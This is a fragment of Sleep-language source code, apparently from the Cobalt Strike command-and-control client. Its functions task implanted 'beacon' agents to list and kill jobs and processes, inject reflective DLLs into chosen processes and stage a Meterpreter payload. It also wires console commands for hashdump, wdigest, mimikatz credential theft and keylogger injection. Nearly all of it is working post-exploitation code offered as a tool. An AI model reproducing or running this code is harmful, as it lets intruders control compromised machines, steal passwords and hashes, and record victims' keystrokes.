...
sub taskBeaconJobs {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("II", 0x29, 0), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to list jobs\n");
	}
}
...
sub taskBeaconJobKill {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIS", 0x2a, 2, $2), $MY_ADDRESS);
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to kill job $2 $+ \n");
	}
}
...
sub taskBeaconPs {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("III", 0x20, 4, 0x0), $MY_ADDRESS);
...
sub taskBeaconKill {
	local('$id');
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("III", 0x21, 4, $2), $MY_ADDRESS);
...
# find out if a beacon is 64-bit or not and then call a function...
sub callback64 {
...
sub taskBeaconPid {
	[lambda({
		...
		# task the agent(s)...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IIIIZ $+ $len", 0x09, $len + 8, $pid, 0, $data), $MY_ADDRESS); 
...
# @ids, $pid, $dllfile
sub taskBeaconDLLInject {
	local('$id $handle $data $len $off $cmd');
	...
	# find the offset to the reflective loader
	$off  = [common.ReflectiveDLL findReflectiveLoader: $data];
	$len  = strlen($data);

	# sanity check everything
	if ($off <= 0 && $4 !is $null) {
		[$4 append: "[-] Could not find reflective loader in $3 $+ \n"];
		return;
	}

	# the inject command we use will depend on whether or not it's a 64-bit DLL
	if ([common.ReflectiveDLL is64: $data]) {
		$cmd = 0x2b;
	}
	else {
		$cmd = 0x09;
	...
	# task the agent(s)...
	foreach $id ($1) {
		call_async($mclient, "beacon.task", $id, pack("IIIIZ $+ $len", $cmd, $len + 8, $2, $off, $data), $MY_ADDRESS); 
		call_async($mclient, "beacon.log_write", $id, "[*] Tasked beacon to inject $3 into $2 $+ \n");
	}
}
...
sub taskBeaconMeterpreter {
	thread(lambda({
		...
		foreach $id (@ids) {
			call_async($mclient, "beacon.task", $id, pack("IIII", 0x04, 8, 100, 90), $MY_ADDRESS);
			call_async($mclient, "beacon.task", $id, pack("IIIZ $+ $len", 0x12, $len + 4, $port, $data), $MY_ADDRESS); 
...
sub createBeaconConsole {
	...
	[[$console getInput] addActionListener: lambda({
		...
		if ($text in $help) {
		...
		else if ($text eq "hashdump") {
			callback64($id, $null, {
				local('$job');
				$job  = [new HashdumpJob: &taskit];
				[$job spawn: $1, $3];
			});
		}
		else if ($text eq "wdigest") {
			callback64($id, $null, {
				local('$job');
		...
		else if ($text ismatch 'dllinject (\d+)') {
			local('$pid $dllf');
			($pid) = matched()[0];

			openFile(lambda({
				taskBeaconDLLInject(@ids, $pid, $1, $console);
			}, @ids => @($id), \$pid, \$console), $title => "Select Reflective DLL");
		}
			...
			if ($first eq "sleep") {
			...
			else if ($first eq "jobkill") {
				taskBeaconJobKill(@($id), $second);
			}
				...
				local('$pid $arch $job');
				if ($second ismatch '(\\d+) (x86|x64)') {
					($pid, $arch) = matched();
					$job  = [new KeyloggerJob: &taskit];
					[$job inject: $id, int($pid), $arch];
				}
				else if ($second ismatch '\\d+') {
					$pid  = $second;
					$job  = [new KeyloggerJob: &taskit];
					[$job inject: $id, int($pid), "x86"];
				}
				else {
					[$console append: "[-] I don't understand these arguments.\n"];
				}
			}
			# steal a token yo
			...
			else if ($first eq "mimikatz") {
				callback64($id, $second, {
					local('$job');
					$job  = [new MimikatzJob: &taskit, $2];
					[$job spawn: $1, $3];
				});
			}
			...
			else if ($first eq "dllinject") {
				local('$pid $dllf');
				($pid, $dllf) = matches($second, '(\d+)\s+(.*)');
				taskBeaconDLLInject(@($id), $pid, $dllf, $console);
			}
